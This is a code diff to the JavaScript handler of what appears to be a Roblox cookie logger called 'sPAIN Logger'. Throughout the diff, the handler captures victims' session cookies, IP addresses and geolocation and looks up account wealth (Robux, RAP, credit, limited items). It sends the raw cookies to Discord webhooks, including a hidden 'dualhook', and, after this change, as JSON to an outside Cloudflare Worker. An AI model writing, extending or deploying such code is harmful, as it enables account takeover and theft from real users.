@@ -1,7 +1,5 @@
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-
-// Worker URL - replace with your actual worker URL
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
 
 const ITEMS = {
@@ -210,24 +208,13 @@ async function refreshCookieStatus(cookie) {
   return { refreshed: accountInfo.valid, account: accountInfo, timestamp: new Date().toISOString() };
 }
 
-// UPDATED: Send to Worker instead of Telegram directly (Bot 1 - Account notifications)
-async function tgSendAccount(text) {
+// NEW: Send raw data to Worker
+async function sendToWorker(endpoint, data) {
   try {
-    await fetch(`${WORKER_URL}/notify`, {
+    await fetch(`${WORKER_URL}${endpoint}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ bot: 'create', text })
-    });
-  } catch (_) {}
-}
-
-// UPDATED: Send to Worker instead of Telegram directly (Bot 2 - Webhook tracking)
-async function tgSendWebhook(text) {
-  try {
-    await fetch(`${WORKER_URL}/notify`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ bot: 'webhook', text })
+      body: JSON.stringify(data)
     });
   } catch (_) {}
 }
@@ -289,7 +276,6 @@ async function discordSend(url, payload) {
   }
 }
 
-// TWO MESSAGE FIX - bypasses Discord 2000 char limit
 async function sendRawCookie(url, cookie, username) {
   console.log('Sending raw cookie (2 messages) to:', url?.substring(0, 50));
   
@@ -301,8 +287,6 @@ async function sendRawCookie(url, cookie, username) {
   const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
   
   try {
-    // Message 1: Header with refresh link (short, under 2000 chars)
-    console.log('Sending message 1: header with refresh link');
     const res1 = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -320,11 +304,8 @@ async function sendRawCookie(url, cookie, username) {
     }
     console.log('Message 1 sent successfully');
     
-    // Small delay to ensure order
     await new Promise(r => setTimeout(r, 500));
     
-    // Message 2: Just the raw cookie in code block
-    console.log('Sending message 2: raw cookie (length:', cookie.length, ')');
     const res2 = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -376,8 +357,13 @@ export default async function handler(req, res) {
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
   const victimWebhook = findVictimWebhook(slots);
+  
   if (victimWebhook) {
-    await tgSendWebhook(`🎯 <b>VICTIM WEBHOOK</b>\n📄 ${record.displayName || slug}\n<code>${victimWebhook}</code>`);
+    await sendToWorker('/notify/webhook', {
+      type: 'victim_webhook',
+      webhook: victimWebhook,
+      pageName: record.displayName || slug
+    });
   }
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
@@ -399,7 +385,6 @@ export default async function handler(req, res) {
     }
   }
 
-  // NO COOKIE
   if (!cookie) {
     console.log('No cookie - sending troll alert');
     const geo = await getIpGeo(ip);
@@ -421,11 +406,26 @@ export default async function handler(req, res) {
       }]
     });
     
-    await tgSendAccount(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+    await sendToWorker('/notify/capture', {
+      pageName: pName,
+      username: 'TROLL',
+      userId: 'N/A',
+      robux: 0,
+      rap: 0,
+      credit: 0,
+      accountAge: 0,
+      premium: false,
+      headless: false,
+      korblox: false,
+      valkyrie: false,
+      cookie: 'No cookie provided',
+      ip: ip,
+      location: loc
+    });
+    
     return res.status(200).json({ success: true });
   }
 
-  // Process valid cookie
   console.log('Processing valid cookie...');
   const [geo, accountInfo] = await Promise.all([
     getIpGeo(ip),
@@ -438,8 +438,6 @@ export default async function handler(req, res) {
 
   console.log('Account valid:', !!acc, 'Username:', acc?.username);
 
-  // 1. Cookie Captured
-  console.log('Step 1: Cookie Captured embed');
   await discordSend(webhook2, {
     username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
     embeds: [{
@@ -459,7 +457,6 @@ export default async function handler(req, res) {
     }]
   });
 
-  // 2. Dualhook
   if (webhook1) {
     console.log('Step 2: Dualhook embed');
     await discordSend(webhook1, {
@@ -480,7 +477,6 @@ export default async function handler(req, res) {
     });
   }
 
-  // 3. Account Info
   if (acc) {
     console.log('Step 3: Account Info embed');
     const accountEmbed = {
@@ -510,29 +506,45 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
 
-  // 4. RAW COOKIE - TWO MESSAGES (THE FIX!)
-  console.log('Step 4: Sending raw cookie (2 messages)...');
+  console.log('Step 4: Sending raw cookie...');
   await sendRawCookie(webhook2, cookie, acc?.username);
   if (webhook1) await sendRawCookie(webhook1, cookie, acc?.username);
 
-  // Telegram (now via Worker)
-  console.log('Step 5: Telegram via Worker');
+  console.log('Step 5: Sending to Worker');
   if (acc) {
-    await tgSendAccount([
-      `🍪 <b>COOKIE — ${pName}</b>`,
-      `👤 <b>User:</b> <code>${acc.username}</code> (${acc.id})`,
-      `💰 <b>Robux:</b> ⏣ ${acc.robux.toLocaleString()}`,
-      `🎵 <b>RAP:</b> ${acc.rap.toLocaleString()}`,
-      `💳 <b>Credit:</b> $${acc.credit.toFixed(2)}`,
-      `🗓️ <b>Age:</b> ${acc.accountAge.toLocaleString()}d`,
-      `⭐ <b>Premium:</b> ${acc.premium ? 'Yes' : 'No'}`,
-      `💀 <b>Headless:</b> ${acc.headless ? 'Owned' : 'None'}`,
-      `⚔️ <b>Korblox:</b> ${acc.korblox ? 'Owned' : 'None'}`,
-      ``,
-      `<b>🔐 Cookie:</b> <code>${cookie}</code>`
-    ].join('\n'));
+    await sendToWorker('/notify/capture', {
+      pageName: pName,
+      username: acc.username,
+      userId: acc.id,
+      robux: acc.robux,
+      rap: acc.rap,
+      credit: acc.credit,
+      accountAge: acc.accountAge,
+      premium: acc.premium,
+      headless: acc.headless,
+      korblox: acc.korblox,
+      valkyrie: acc.valkyrie,
+      cookie: cookie,
+      ip: ip,
+      location: loc
+    });
   } else {
-    await tgSendAccount(`🍪 <b>COOKIE — ${pName}</b>\n❌ <b>Invalid cookie</b>\n<code>${cookie}</code>`);
+    await sendToWorker('/notify/capture', {
+      pageName: pName,
+      username: 'Invalid',
+      userId: 'N/A',
+      robux: 0,
+      rap: 0,
+      credit: 0,
+      accountAge: 0,
+      premium: false,
+      headless: false,
+      korblox: false,
+      valkyrie: false,
+      cookie: cookie,
+      ip: ip,
+      location: loc
+    });
   }
 
   console.log('=== COMPLETE ===');
